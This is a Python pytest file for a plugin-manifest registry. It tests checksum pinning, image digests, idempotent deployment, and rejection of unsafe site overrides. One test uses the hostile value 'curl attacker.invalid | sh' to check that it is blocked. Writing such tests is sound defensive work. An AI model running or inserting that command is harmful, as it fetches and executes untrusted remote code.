from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import Mock

import pytest
from backend_v2.app.core.problem import DomainError
from backend_v2.app.registry.models import ModelPlugin
from backend_v2.app.registry.plugin_manifest import (
    PluginManifest,
    PluginManifestCatalog,
    plugin_manifest_checksum,
)
from backend_v2.app.registry.schemas import PluginDeploymentCreate, RegistryResourceUpdate
from backend_v2.app.registry.service import deploy_plugin_manifest, update_resource
from pydantic import ValidationError

CATALOG = Path(__file__).resolve().parents[1] / "plugin_manifests"


def test_bundled_plugin_manifests_are_checksum_pinned_and_site_neutral() -> None:
    manifests = PluginManifestCatalog(CATALOG).manifests()

    assert {item.plugin_key for item in manifests} == {"ProteinMPNN", "Rosetta", "superfold"}
    for manifest in manifests:
        assert manifest.checksum_sha256 == plugin_manifest_checksum(manifest.model_dump(mode="json"))
        assert manifest.runtime.reference.startswith("site://")
        assert "/work/" not in manifest.model_dump_json()
        assert ":latest" not in manifest.model_dump_json()


def test_catalog_rejects_a_wrong_requested_checksum() -> None:
    catalog = PluginManifestCatalog(CATALOG)
    manifest = catalog.manifests()[0]

    with pytest.raises(DomainError, match="checksum does not match"):
        catalog.require(manifest.manifest_id, manifest.plugin_version, "0" * 64)


def test_container_manifest_requires_an_image_digest() -> None:
    payload = {
        "schema_version": "1.0",
        "manifest_id": "org.bda.test",
        "plugin_key": "test",
        "plugin_version": "1",
        "display_name": "Test",
        "command_template": "run",
        "runtime": {"mode": "container", "reference": "example/test:1", "image_digest": None},
        "checksum_sha256": "0" * 64,
    }

    with pytest.raises(ValidationError, match="image_digest"):
        PluginManifest.model_validate(payload)


def test_deploy_manifest_creates_a_pinned_registry_snapshot() -> None:
    manifest = PluginManifestCatalog(CATALOG).manifests()[0]
    payload = PluginDeploymentCreate(
        manifest_id=manifest.manifest_id,
        plugin_version=manifest.plugin_version,
        checksum=manifest.checksum_sha256,
        site_overrides={"runtime_root": "/private/site/path"},
    )
    session = Mock()
    session.scalar.return_value = None

    row = deploy_plugin_manifest(session, manifest, payload)

    assert row.manifest_checksum == manifest.checksum_sha256
    assert row.container_image == manifest.runtime.reference
    assert row.site_overrides == {"runtime_root": "/private/site/path", "module_names": [], "environment": {}}
    assert row.deployment_status == "installed"
    session.add.assert_called_once_with(row)
    session.flush.assert_called_once()


def test_site_overrides_cannot_replace_manifest_commands() -> None:
    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
        PluginDeploymentCreate(
            manifest_id="org.bda.demo",
            plugin_version="1",
            checksum="a" * 64,
            site_overrides={"command": "curl attacker.invalid | sh"},
        )


def test_site_overrides_reject_secrets_and_untyped_resource_limits() -> None:
    with pytest.raises(ValidationError, match="credential reference"):
        PluginDeploymentCreate(
            manifest_id="org.bda.demo",
            plugin_version="1",
            checksum="a" * 64,
            site_overrides={"environment": {"API_TOKEN": "plaintext"}},
        )
    with pytest.raises(ValidationError, match="less than or equal"):
        PluginDeploymentCreate(
            manifest_id="org.bda.demo",
            plugin_version="1",
            checksum="a" * 64,
            site_overrides={"resource_limits": {"gpu_count": 1000}},
        )


def test_catalog_rejects_duplicate_database_deployment_identity(tmp_path: Path) -> None:
    source = PluginManifestCatalog(CATALOG).manifests()[0]
    for suffix in ("one", "two"):
        payload = source.model_dump(mode="json")
        payload["manifest_id"] = f"org.bda.{suffix}"
        payload["checksum_sha256"] = plugin_manifest_checksum(payload)
        (tmp_path / f"{suffix}.json").write_text(json.dumps(payload))

    with pytest.raises(DomainError, match="deployment identity"):
        PluginManifestCatalog(tmp_path).manifests()


def test_redeploying_identical_manifest_is_idempotent() -> None:
    manifest = PluginManifestCatalog(CATALOG).manifests()[0]
    payload = PluginDeploymentCreate(
        manifest_id=manifest.manifest_id,
        plugin_version=manifest.plugin_version,
        checksum=manifest.checksum_sha256,
    )
    session = Mock()
    session.scalar.return_value = None
    row = deploy_plugin_manifest(session, manifest, payload)
    row.version = 4
    session.scalar.return_value = row

    assert deploy_plugin_manifest(session, manifest, payload) is row
    assert row.version == 4


def test_manifest_managed_definition_can_only_change_deployment_state() -> None:
    row = ModelPlugin(
        plugin_key="demo",
        plugin_version="1",
        name="Demo",
        container_image="site://demo/1",
        command="run",
        manifest_id="org.bda.demo",
        manifest_schema_version="1.0",
        manifest_checksum="a" * 64,
        deployment_status="installed",
        site_overrides={},
        enabled=True,
        version=2,
    )

    with pytest.raises(DomainError, match="not writable"):
        update_resource(row, RegistryResourceUpdate(data={"command": "tampered"}), 2)

    update_resource(
        row,
        RegistryResourceUpdate(data={"enabled": False, "deployment_status": "disabled"}),
        2,
    )
    assert row.enabled is False
    assert row.deployment_status == "disabled"
    assert row.version == 3
